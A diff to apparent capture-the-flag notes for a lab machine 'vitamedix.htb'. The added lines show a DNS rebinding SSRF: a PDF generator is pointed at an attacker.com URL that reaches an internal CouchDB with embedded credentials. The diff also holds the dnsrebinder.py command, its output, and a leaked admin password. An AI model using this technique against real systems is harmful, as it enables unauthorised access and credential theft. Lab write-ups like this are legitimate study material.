@@ -703,6 +703,14 @@ now we get access to vitamedix.htb with the creds michael:9ecf1ffe7c795099b8ad40
 ![[Screenshot from 2026-08-09 17-47-58.png]]
 
 
+
+WE got to pdf generation  and point it to our domain in the DNSrebinder command `attacker.com`
+and we point it to 
+`http://admin:C0uchDB@attacker.com:5984/users/admin`
+
+we get this response
+`{"_id":"admin","_rev":"1-
+2bb338a880df5181a728ee2b9256af36","username":"admin","password":"Adm111n@341","full_name":"Administrator","role":"doctor","address":"Vitamedix"}`
 ### DNS.vitamedix
 
 passowrd leaked for DNS.vitamedix:8006
@@ -730,4 +738,24 @@ services:
 
 ![[Screenshot from 2026-08-09 16-23-03 1.png]]then we login in with password pihole 
 
-![[Screenshot from 2026-08-09 16-23-39.png]]
+![[Screenshot from 2026-08-09 16-23-39.png]]we add our DNS server 
+
+![[Screenshot from 2026-08-09 18-10-49.png]]
+
+and run responder
+
+```terminal
+sudo python3 dnsrebinder.py --domain attacker.com --rebind 0.0.0.0 --ip 1.1.1.1 --counter 1 --tcp --udp
+Starting nameserver...
+UDP server loop running in thread: Thread-1 (serve_forever)
+TCP server loop running in thread: Thread-2 (serve_forever)
+/home/hassan/Desktop/scripts/DNSrebinder/dnsrebinder.py:110: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+  now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
+
+
+```
+
+
+leaked internal url in code 
+
+![[Screenshot from 2026-08-09 18-10-21.png]]
